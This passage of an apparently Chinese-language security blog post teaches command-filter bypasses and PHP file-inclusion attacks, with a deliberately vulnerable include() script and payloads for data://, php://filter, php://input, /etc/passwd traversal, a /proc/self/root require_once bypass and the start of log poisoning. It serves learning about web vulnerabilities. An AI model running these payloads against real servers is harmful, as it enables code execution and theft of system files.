<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">&quot;OS error code   1:  Operation not permitted&quot;</span><br><span class="line">&quot;OS error code   2:  No such file or directory&quot;</span><br><span class="line">&quot;OS error code   3:  No such process&quot;</span><br><span class="line">&quot;OS error code   4:  Interrupted system call&quot;</span><br><span class="line">&quot;OS error code   5:  Input/output error&quot;</span><br><span class="line">&quot;OS error code   6:  No such device or address&quot;</span><br><span class="line">&quot;OS error code   7:  Argument list too long&quot;</span><br><span class="line">&quot;OS error code   8:  Exec format error&quot;</span><br><span class="line">&quot;OS error code   9:  Bad file descriptor&quot;</span><br><span class="line">&quot;OS error code  10:  No child processes&quot;</span><br><span class="line">&quot;OS error code  11:  Resource temporarily unavailable&quot;</span><br><span class="line">&quot;OS error code  12:  Cannot allocate memory&quot;</span><br><span class="line">&quot;OS error code  13:  Permission denied&quot;</span><br><span class="line">&quot;OS error code  14:  Bad address&quot;</span><br><span class="line">&quot;OS error code  15:  Block device required&quot;</span><br><span class="line">&quot;OS error code  16:  Device or resource busy&quot;</span><br><span class="line">&quot;OS error code  17:  File exists&quot;</span><br><span class="line">&quot;OS error code  18:  Invalid cross-device link&quot;</span><br><span class="line">&quot;OS error code  19:  No such device&quot;</span><br><span class="line">&quot;OS error code  20:  Not a directory&quot;</span><br><span class="line">&quot;OS error code  21:  Is a directory&quot;</span><br><span class="line">&quot;OS error code  22:  Invalid argument&quot;</span><br><span class="line">&quot;OS error code  23:  Too many open files in system&quot;</span><br><span class="line">&quot;OS error code  24:  Too many open files&quot;</span><br><span class="line">&quot;OS error code  25:  Inappropriate ioctl for device&quot;</span><br><span class="line">&quot;OS error code  26:  Text file busy&quot;</span><br><span class="line">&quot;OS error code  27:  File too large&quot;</span><br><span class="line">&quot;OS error code  28:  No space left on device&quot;</span><br><span class="line">&quot;OS error code  29:  Illegal seek&quot;</span><br><span class="line">&quot;OS error code  30:  Read-only file system&quot;</span><br><span class="line">&quot;OS error code  31:  Too many links&quot;</span><br><span class="line">&quot;OS error code  32:  Broken pipe&quot;</span><br><span class="line">&quot;OS error code  33:  Numerical argument out of domain&quot;</span><br><span class="line">&quot;OS error code  34:  Numerical result out of range&quot;</span><br><span class="line">&quot;OS error code  35:  Resource deadlock avoided&quot;</span><br><span class="line">&quot;OS error code  36:  File name too long&quot;</span><br><span class="line">&quot;OS error code  37:  No locks available&quot;</span><br><span class="line">&quot;OS error code  38:  Function not implemented&quot;</span><br><span class="line">&quot;OS error code  39:  Directory not empty&quot;</span><br><span class="line">&quot;OS error code  40:  Too many levels of symbolic links&quot;</span><br><span class="line">&quot;OS error code  42:  No message of desired type&quot;</span><br><span class="line">&quot;OS error code  43:  Identifier removed&quot;</span><br><span class="line">&quot;OS error code  44:  Channel number out of range&quot;</span><br><span class="line">&quot;OS error code  45:  Level 2 not synchronized&quot;</span><br><span class="line">&quot;OS error code  46:  Level 3 halted&quot;</span><br><span class="line">&quot;OS error code  47:  Level 3 reset&quot;</span><br><span class="line">&quot;OS error code  48:  Link number out of range&quot;</span><br><span class="line">&quot;OS error code  49:  Protocol driver not attached&quot;</span><br><span class="line">&quot;OS error code  50:  No CSI structure available&quot;</span><br><span class="line">&quot;OS error code  51:  Level 2 halted&quot;</span><br><span class="line">&quot;OS error code  52:  Invalid exchange&quot;</span><br><span class="line">&quot;OS error code  53:  Invalid request descriptor&quot;</span><br><span class="line">&quot;OS error code  54:  Exchange full&quot;</span><br><span class="line">&quot;OS error code  55:  No anode&quot;</span><br><span class="line">&quot;OS error code  56:  Invalid request code&quot;</span><br><span class="line">&quot;OS error code  57:  Invalid slot&quot;</span><br><span class="line">&quot;OS error code  59:  Bad font file format&quot;</span><br><span class="line">&quot;OS error code  60:  Device not a stream&quot;</span><br><span class="line">&quot;OS error code  61:  No data available&quot;</span><br><span class="line">&quot;OS error code  62:  Timer expired&quot;</span><br><span class="line">&quot;OS error code  63:  Out of streams resources&quot;</span><br><span class="line">&quot;OS error code  64:  Machine is not on the network&quot;</span><br><span class="line">&quot;OS error code  65:  Package not installed&quot;</span><br><span class="line">&quot;OS error code  66:  Object is remote&quot;</span><br><span class="line">&quot;OS error code  67:  Link has been severed&quot;</span><br><span class="line">&quot;OS error code  68:  Advertise error&quot;</span><br><span class="line">&quot;OS error code  69:  Srmount error&quot;</span><br><span class="line">&quot;OS error code  70:  Communication error on send&quot;</span><br><span class="line">&quot;OS error code  71:  Protocol error&quot;</span><br><span class="line">&quot;OS error code  72:  Multihop attempted&quot;</span><br><span class="line">&quot;OS error code  73:  RFS specific error&quot;</span><br><span class="line">&quot;OS error code  74:  Bad message&quot;</span><br><span class="line">&quot;OS error code  75:  Value too large for defined data type&quot;</span><br><span class="line">&quot;OS error code  76:  Name not unique on network&quot;</span><br><span class="line">&quot;OS error code  77:  File descriptor in bad state&quot;</span><br><span class="line">&quot;OS error code  78:  Remote address changed&quot;</span><br><span class="line">&quot;OS error code  79:  Can not access a needed shared library&quot;</span><br><span class="line">&quot;OS error code  80:  Accessing a corrupted shared library&quot;</span><br><span class="line">&quot;OS error code  81:  .lib section in a.out corrupted&quot;</span><br><span class="line">&quot;OS error code  82:  Attempting to link in too many shared libraries&quot;</span><br><span class="line">&quot;OS error code  83:  Cannot exec a shared library directly&quot;</span><br><span class="line">&quot;OS error code  84:  Invalid or incomplete multibyte or wide character&quot;</span><br><span class="line">&quot;OS error code  85:  Interrupted system call should be restarted&quot;</span><br><span class="line">&quot;OS error code  86:  Streams pipe error&quot;</span><br><span class="line">&quot;OS error code  87:  Too many users&quot;</span><br><span class="line">&quot;OS error code  88:  Socket operation on non-socket&quot;</span><br><span class="line">&quot;OS error code  89:  Destination address required&quot;</span><br><span class="line">&quot;OS error code  90:  Message too long&quot;</span><br><span class="line">&quot;OS error code  91:  Protocol wrong type for socket&quot;</span><br><span class="line">&quot;OS error code  92:  Protocol not available&quot;</span><br><span class="line">&quot;OS error code  93:  Protocol not supported&quot;</span><br><span class="line">&quot;OS error code  94:  Socket type not supported&quot;</span><br><span class="line">&quot;OS error code  95:  Operation not supported&quot;</span><br><span class="line">&quot;OS error code  96:  Protocol family not supported&quot;</span><br><span class="line">&quot;OS error code  97:  Address family not supported by protocol&quot;</span><br><span class="line">&quot;OS error code  98:  Address already in use&quot;</span><br><span class="line">&quot;OS error code  99:  Cannot assign requested address&quot;</span><br><span class="line">&quot;OS error code 100:  Network is down&quot;</span><br><span class="line">&quot;OS error code 101:  Network is unreachable&quot;</span><br><span class="line">&quot;OS error code 102:  Network dropped connection on reset&quot;</span><br><span class="line">&quot;OS error code 103:  Software caused connection abort&quot;</span><br><span class="line">&quot;OS error code 104:  Connection reset by peer&quot;</span><br><span class="line">&quot;OS error code 105:  No buffer space available&quot;</span><br><span class="line">&quot;OS error code 106:  Transport endpoint is already connected&quot;</span><br><span class="line">&quot;OS error code 107:  Transport endpoint is not connected&quot;</span><br><span class="line">&quot;OS error code 108:  Cannot send after transport endpoint shutdown&quot;</span><br><span class="line">&quot;OS error code 109:  Too many references: cannot splice&quot;</span><br><span class="line">&quot;OS error code 110:  Connection timed out&quot;</span><br><span class="line">&quot;OS error code 111:  Connection refused&quot;</span><br><span class="line">&quot;OS error code 112:  Host is down&quot;</span><br><span class="line">&quot;OS error code 113:  No route to host&quot;</span><br><span class="line">&quot;OS error code 114:  Operation already in progress&quot;</span><br><span class="line">&quot;OS error code 115:  Operation now in progress&quot;</span><br><span class="line">&quot;OS error code 116:  Stale NFS file handle&quot;</span><br><span class="line">&quot;OS error code 117:  Structure needs cleaning&quot;</span><br><span class="line">&quot;OS error code 118:  Not a XENIX named type file&quot;</span><br><span class="line">&quot;OS error code 119:  No XENIX semaphores available&quot;</span><br><span class="line">&quot;OS error code 120:  Is a named type file&quot;</span><br><span class="line">&quot;OS error code 121:  Remote I/O error&quot;</span><br><span class="line">&quot;OS error code 122:  Disk quota exceeded&quot;</span><br><span class="line">&quot;OS error code 123:  No medium found&quot;</span><br><span class="line">&quot;OS error code 124:  Wrong medium type&quot;</span><br><span class="line">&quot;OS error code 125:  Operation canceled&quot;</span><br><span class="line">&quot;OS error code 126:  Required key not available&quot;</span><br><span class="line">&quot;OS error code 127:  Key has expired&quot;</span><br><span class="line">&quot;OS error code 128:  Key has been revoked&quot;</span><br><span class="line">&quot;OS error code 129:  Key was rejected by service&quot;</span><br><span class="line">&quot;OS error code 130:  Owner died&quot;</span><br><span class="line">&quot;OS error code 131:  State not recoverable&quot;</span><br><span class="line">&quot;MySQL error code 132: Old database file&quot;</span><br><span class="line">&quot;MySQL error code 133: No record read before update&quot;</span><br><span class="line">&quot;MySQL error code 134: Record was already deleted (or record file crashed)&quot;</span><br><span class="line">&quot;MySQL error code 135: No more room in record file&quot;</span><br><span class="line">&quot;MySQL error code 136: No more room in index file&quot;</span><br><span class="line">&quot;MySQL error code 137: No more records (read after end of file)&quot;</span><br><span class="line">&quot;MySQL error code 138: Unsupported extension used for table&quot;</span><br><span class="line">&quot;MySQL error code 139: Too big row&quot;</span><br><span class="line">&quot;MySQL error code 140: Wrong create options&quot;</span><br><span class="line">&quot;MySQL error code 141: Duplicate unique key or constraint on write or update&quot;</span><br><span class="line">&quot;MySQL error code 142: Unknown character set used&quot;</span><br><span class="line">&quot;MySQL error code 143: Conflicting table definitions in sub-tables of MERGE table&quot;</span><br><span class="line">&quot;MySQL error code 144: Table is crashed and last repair failed&quot;</span><br><span class="line">&quot;MySQL error code 145: Table was marked as crashed and should be repaired&quot;</span><br><span class="line">&quot;MySQL error code 146: Lock timed out; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 147: Lock table is full;  Restart program with a larger locktable&quot;</span><br><span class="line">&quot;MySQL error code 148: Updates are not allowed under a read only transactions&quot;</span><br><span class="line">&quot;MySQL error code 149: Lock deadlock; Retry transaction&quot;</span><br><span class="line">&quot;MySQL error code 150: Foreign key constraint is incorrectly formed&quot;</span><br><span class="line">&quot;MySQL error code 151: Cannot add a child row&quot;</span><br><span class="line">&quot;MySQL error code 152: Cannot delete a parent row&quot;</span><br></pre></td></tr></table></figure>

<p>这种情况适用于我们平时想通过构造数字但是没什么思路的时候，但感觉这是有点偏的一个思路</p>
<h3 id="自定义环境变量绕过"><a href="#自定义环境变量绕过" class="headerlink" title="自定义环境变量绕过"></a>自定义环境变量绕过</h3><p>这是一个比较常见的姿势了，当我们的环境禁用了很多命令的时候可以利用这个去桡骨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=l;b=s;$a$b</span><br></pre></td></tr></table></figure>

<p>本地测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/# ls</span><br><span class="line">bin   data  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr</span><br><span class="line">boot  dev   home  lib32  libx32  media       opt  root  sbin  srv   tmp  var</span><br><span class="line">root@VM-16-12-ubuntu:/# a=l;b=s;$a$b</span><br><span class="line">bin   data  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr</span><br><span class="line">boot  dev   home  lib32  libx32  media       opt  root  sbin  srv   tmp  var</span><br></pre></td></tr></table></figure>

<p>说明这种拼接方式是可以的，但是目前限制条件我还没研究到，后面再补上</p>
<h1 id="文件包含姿势"><a href="#文件包含姿势" class="headerlink" title="文件包含姿势"></a>文件包含姿势</h1><p>漏洞产生条件</p>
<p>如果文件包含函数没有经过严格的过滤或者定义，并且参数可以被用户控制，这样就有可能包含恶意的文件。</p>
<p>PHP文件包含函数有以下四种：</p>
<ul>
<li>include</li>
<li>inclued_once</li>
<li>require</li>
<li>require_once</li>
</ul>
<p><code>require()/require_once()</code>：如果在包含过程中有错，那么直接退出，不执行进一步操作。<br><code>include()/include_once()</code>: 如果在包含过程中出错，只会发出警告</p>
<p>加上后缀_once的作用区别就是：如果文件已经包含过了，那么不会再次包含</p>
<h2 id="无限制本地文件包含"><a href="#无限制本地文件包含" class="headerlink" title="无限制本地文件包含"></a>无限制本地文件包含</h2><p>include($a)就是没有为包含文件指定特定的前缀或扩展名</p>
<p><strong>include函数</strong>就是包含文件的函数，这里的话会把$a的内容包含进来</p>
<p>举个例子，首先我们先创建一个1.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后创建一个2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接着对参数a传入2.php就会执行phpinfo函数</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306180528089.png" alt="image-20250306180528089"></p>
<p>换成别的文件类型也是一样的，例如我把后缀换成jpg</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306180648047.png" alt="image-20250306180648047"></p>
<p>可以看出<strong>，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来</strong>。</p>
<p>所以我们可以把参数指向的文件内容嵌入到其中就可以使得代码成功解析，达到一个rce的效果</p>
<p>我们可以用data伪协议</p>
<h3 id="data伪协议文件包含"><a href="#data伪协议文件包含" class="headerlink" title="data伪协议文件包含"></a>data伪协议文件包含</h3><p>使用的条件:</p>
<p>allow_url_fopen : on </p>
<p>allow_url_include :on</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306182827429.png" alt="image-20250306182827429"></p>
<p>data:&#x2F;&#x2F; 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</p>
<p>我们拿刚刚的试一下</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">解释一下</span><br><span class="line">data:：这是数据 URL 的前缀，告诉浏览器或应用程序后续的数据是以数据方式嵌入的，而不是指向外部资源。</span><br><span class="line">text/plain：这是 MIME 类型，表示数据的格式。在这个例子中，text/plain 表示数据是普通文本。MIME 类型用于告知接收端如何处理数据。</span><br><span class="line">&lt;?php phpinfo();?&gt;：这是实际的数据内容。在这里，这是一个 PHP 代码片段，它调用了 phpinfo() 函数。该函数用于输出有关当前 PHP 环境和配置的详细信息，包括 PHP 版本、加载的扩展、服务器信息、PHP 配置选项等。</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306181247298.png" alt="image-20250306181247298"></p>
<p>这里没执行成功是因为php配置的问题</p>
<p>data协议使用的条件:allow_url_fopen:on allow_url_include :on</p>
<p>改一下php.ini文件就可以了</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306182241606.png" alt="image-20250306182241606"></p>
<p>可以看到我们传入的代码被正常解析了，另外用base64编码也是可以的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<h3 id="filter协议文件包含"><a href="#filter协议文件包含" class="headerlink" title="filter协议文件包含"></a>filter协议文件包含</h3><p>使用条件：</p>
<p>allow_url_include &#x3D; On</p>
<p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p>
<p><strong>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行</strong>。我们试一下对2.php文件进行包含</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?a=php://filter/resource=2.php</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306191802512.png" alt="image-20250306191802512"></p>
<p>这时候可以看到已经成功执行了里面的phpinfo()函数。</p>
<p>但是我们一般也可以对其进行编码，让其不执行。从而导致任意文件读取。</p>
<p>例如我们对刚刚的2.php进行读取</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306191618115.png" alt="image-20250306191618115"></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=php://filter/read=convert.base64-encode/resource=2.php</span><br></pre></td></tr></table></figure>

<p><code>convert.base64-encode</code> 表示将数据进行 Base64 编码。</p>
<p><code>resource=2.php</code>：这部分指定了要处理的资源</p>
<p>但是这里的话需要注意，filter伪协议不能搭配我们的通配符去使用，对于 <code>php://filter</code> 这种用于数据过滤和流处理的伪协议，一般不支持通配符操作。</p>
<h3 id="input协议文件包含"><a href="#input协议文件包含" class="headerlink" title="input协议文件包含"></a>input协议文件包含</h3><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。</p>
<p>所以我们可以对参数传入php:&#x2F;&#x2F;input，然后post传入PHP恶意代码</p>
<p>另外我们也可以通过文件包含去读取文件内容</p>
<h3 id="获取敏感文件"><a href="#获取敏感文件" class="headerlink" title="获取敏感文件"></a>获取敏感文件</h3><p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p>我们试着去读取一个文件</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306185618976.png" alt="image-20250306185618976"></p>
<p>这里我把3.txt放在了1.php的上一级目录中，这时候也是可以读到的</p>
<h2 id="有限制本地文件包含漏洞"><a href="#有限制本地文件包含漏洞" class="headerlink" title="有限制本地文件包含漏洞"></a>有限制本地文件包含漏洞</h2><p>**include($c.”.php”)**文件包含是代码中为包含文件指定了特定的前缀或者拓展名，这时候我们就需要对扩展名进行过滤绕过</p>
<p>这行代码的作用是将一个PHP文件的内容包含（或插入）到当前执行的脚本中。这里$c 是一个变量，它的值会被附加到字符串 “.php” 之前，从而构成要包含文件的完整路径（或至少是文件名，如果文件位于当前工作目录中）</p>
<p>例如我们传入test，那么实际上就会包含并执行test.php的文件，我们试一下</p>
<p>先在web目录中创建一个2.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>然后传入2</p>
<p><img src="/../image/achieve/202411/RCE%E7%9A%84bypass/image-20250306184455805.png" alt="image-20250306184455805"></p>
<p>出来了，证明猜想是对的</p>
<p>那这时候怎么绕过呢?</p>
<p>常见的过滤绕过方式有三种：</p>
<h3 id="00截断文件包含"><a href="#00截断文件包含" class="headerlink" title="%00截断文件包含"></a>%00截断文件包含</h3><p>利用条件</p>
<p>这个漏洞的使用必须满足如下条件</p>
<ul>
<li>magic_quotes_gpc&#x3D;off</li>
<li>PHP版本低于5.3.4</li>
</ul>
<p>跟之前做的那个文件上传的00截断是一样的，就是把后缀名给截断掉，然后就可以像正常的无限制本地包含一样去进行</p>
<h3 id="路径长度截断文件包含"><a href="#路径长度截断文件包含" class="headerlink" title="路径长度截断文件包含"></a>路径长度截断文件包含</h3><p>操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。</p>
<ul>
<li>Windows下最大路径长度为256B</li>
<li>Linux下最大路径长度为4096B</li>
</ul>
<p>但是这个感觉比较麻烦</p>
<h3 id="点号截断文件包含"><a href="#点号截断文件包含" class="headerlink" title="点号截断文件包含"></a>点号截断文件包含</h3><p>漏洞利用条件</p>
<p>点号截断包含<strong>只使用与Windows系统</strong>，点号的长度大于256B的时候，就可以造成拓展名截断</p>
<p>另外的话我们讲一下关于data伪协议在这里面的作用</p>
<p><strong>data:&#x2F;&#x2F;text&#x2F;plain, 这样就相当于执行了php语句, .php 因为前面的php语句已经闭合了</strong>，所以后面的.php会直接显示在屏幕上不会对传入的代码造成影响</p>
<h3 id="require-once-绕过不能重复包含文件的限制"><a href="#require-once-绕过不能重复包含文件的限制" class="headerlink" title="require_once 绕过不能重复包含文件的限制"></a>require_once 绕过不能重复包含文件的限制</h3><p>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，如果代码中已经执行过require_once(‘1.php’)，这个已经包含的文件就不能再次require_once了，那我们应该如何让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容呢？</p>
<p>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，例如payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<p>接下来我们仔细分析下，这里就是关于我们上面所说的路径的解析，也就是路径长度截断文件包含</p>
<p>简单来说，在检查传入的文件的解析过程中，是从后往前去匹配的，也就是递归机制，递归机制是从后往前，<code>/var/www/html/1.php -&gt; /var/www/html -&gt; /var/www</code>。</p>
<p>而这个递归调用是<code>tsrm_realpath_r</code>去执行的，<code>tsrm_realpath_r</code>是用来解析真实路径的</p>
<p>还有一个相关的函数php_sys_lstat</p>
<p>php_sys_lstat()是用来获取一些文件相关的信息，成功执行时，返回0。失败返回-1，并且会设置<code>errno</code>，因为之前符号链接过多，所以<code>errno</code>就都是<code>ELOOP</code>，符号链接的循环数量真正取决于<code>SYMLOOP_MAX</code>，这是个<code>runtime-value</code>，它的值不能小于<code>_POSIX_SYMLOOP_MAX</code>。</p>
<p>所以一大堆<code>/proc/self/root</code>拼一起，从后往前倒，递归调用<code>tsrm_real_path_r</code>，直到<code>php_sys_lstat</code>返回<code>0</code>，即成功。</p>
<p>所以在我们的payload中在&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php前面的软链接均不会生效，且由于超过了长度限制会被截断，最后只返回&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php的结果</p>
<h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><h3 id="中间件日志文件包含"><a href="#中间件日志文件包含" class="headerlink" title="中间件日志文件包含"></a>中间件日志文件包含</h3><p>服务器的中间件都会有日志记录的功能，如果开启了日志记录功能，用户访问的日志就会存储到不同服务的相关文件。</p>
<p>如果日志文件的位置是默认位置或者是可以通过其他方法获取，就可以通过访问日志将恶意代码写入到日志文件中去，然后通过文件包含漏洞包含日志中的恶意代码，获得权限。</p>
<p>利用条件:</p>
<ul>
<li>web中间件日志文件的存储位置已知，并且具有可读权限</li>
</ul>
<p>对于Apache，日志存放路径：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
<p>对于Ngnix，日志存放路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 和 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log。Nginx中的日志分两种，一种是error.log，一种是access.log。error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期间的处理流程相关的信息；access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。</p>
<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log</p>
<p>所以日志文件包含的做法有两种</p>
<ul>
<li>将恶意代码直接写入日志</li>
</ul>
<p>因为日志文件会记录我们的每一个请求的内容，例如访问假设访问URL：<a target="_blank" rel="noopener" href="http://192.168.1.2/api">http://192.168.1.2/api</a><br>发现会在日志文件中有如下内容：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">root@wanth3f1ag</span>]<span class="meta">#less /var/log/httpd/access_log</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.200</span> - - [<span class="number">09</span>/Aug/<span class="number">2021</span>:<span class="number">19</span>:<span class="number">31</span>:<span class="number">20</span> +<span class="number">0800</span>] <span class="string">&quot;GET /api HTTP/1.1&quot;</span> <span class="number">200</span> <span class="number">86.</span>...</span><br></pre></td></tr></table></figure>

<p>这时候我们添加恶意代码</p>
